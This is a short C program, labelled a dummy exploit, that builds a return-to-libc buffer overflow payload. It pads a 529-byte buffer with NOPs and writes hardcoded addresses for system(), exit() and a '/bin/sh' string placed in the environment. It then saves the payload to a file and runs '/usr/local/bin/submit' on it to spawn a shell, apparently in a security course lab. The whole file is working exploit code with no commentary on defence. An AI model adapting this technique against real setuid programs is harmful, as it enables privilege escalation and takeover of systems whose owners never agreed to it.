/*
 * dummy exploit program
 */

#include <stdio.h>
#include <unistd.h>

#define PAYLOAD_SIZE (529)
#define NOP (0x90)

int main(int argc, char **argv) {
	char payload[PAYLOAD_SIZE], *it, *args[4], *env[2];
	int i;
	int ra = 516;
	const int halfway = PAYLOAD_SIZE / 2;
	long *addr_ptr;
	FILE *payload_file;

	/* Padding NOP's to the first-half of the payload */
	memset(payload, NOP, PAYLOAD_SIZE);

	/* Return to libc (system) */
	payload[ra++] = 0x90;
	payload[ra++] = 0xa7;
	payload[ra++] = 0x05;
	payload[ra++] = 0x40;

	/* Call exit after system */
	payload[ra++] = 0x90;
	payload[ra++] = 0xfd;
	payload[ra++] = 0x04;
	payload[ra++] = 0x40;

	/* Argument: /bin/bash from environment variable */
	payload[ra++] = 0xdc;
	payload[ra++] = 0xdf;
	payload[ra++] = 0xbf;
	payload[ra++] = 0xff;

	payload[PAYLOAD_SIZE-1] = 0;

	/* Dump the payload into a file called "out" */
	if ((payload_file = fopen("out", "w+")) == NULL) {
		puts("Cannot open 'out' for writing the payload");
		return -1;
	}

	fprintf(payload_file, "%s", payload);
	fclose(payload_file);

	/* set up arguments and then run the exploit */
	args[0] = "/usr/local/bin/submit";
	args[1] = "out";
	args[2] = "whatever";
	args[3] = NULL;

	env[0] = "/bin/sh  ";
	env[1] = NULL;

	// return -1 means error; otherwise will do return
	return execve(args[0], args, env);
}
